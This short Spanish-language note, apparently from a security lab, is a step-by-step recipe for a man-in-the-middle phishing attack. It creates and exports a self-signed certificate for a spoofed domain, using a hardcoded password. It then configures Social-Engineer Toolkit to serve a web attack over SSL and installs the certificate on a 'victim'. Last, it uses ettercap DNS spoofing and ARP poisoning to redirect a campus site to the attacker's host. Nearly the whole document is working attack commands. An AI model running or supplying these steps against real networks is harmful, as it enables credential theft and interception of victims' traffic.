# Certificates
Generar certificados en linux.pem

Se requiere powershell:

New-SelfSignedCertificate -DnsName pvwa.ibm.edu,www.pvwa.ibm.edu -CertStoreLocation cert:\LocalMachine\My -FriendlyName "pvwa-cyberark" -NotAfter (Get-Date).AddYears(10) -KeyLength 4096
 
 Export-Certificate -Cert Cert:\LocalMachine\My\460D824C40330E8ED1AEF3F931EA9382805DA70F -FilePath C:\cert\cert.cer
 
 $MyPassword = ConvertTo-SecureString -String "Temporal01_" -force -asplaintext
 
 Export-PfxCertificate -Cert Cert:\LocalMachine\My\0A5E5CA292E0CB2DBD2D208E07C63D8F0E08C314 -FilePath C:\cert\key.pfx -Password $MyPassword
 
 openssl pkcs12 -in key.pfx -out key.pem -nodes

mkdir /etc/ssl/public
cp key.pem /etc/ssl/private
cp cert.pem /etc/ssl/public

nano /etc/setoolkit/set.config

WEBATTACK_SSL=ON
WEB_PORT=443

PEM_CLIENT=/etc/ssl/public.PEM
PEM_SERVER=/etc/ssl/private/private.PEM


setoolkit
1
2
3


Instalar certificado a víctima

nano /etc/ettercap/etter.dns
  campus.ceacfp.com A 172.16.8.24

ettercap -G

desactivar primera opción 
arrancar ettercap

tres puntos --> plugins --> activar dns_spoof
tres puntos --> host --> scan host

Target 1 --> gateway
Target 2 --> Victima

Menú de MITM (Bola) --> ARP Poisoning --> primera opcion marcada OK

Pulsamos Play --> envenar victimas




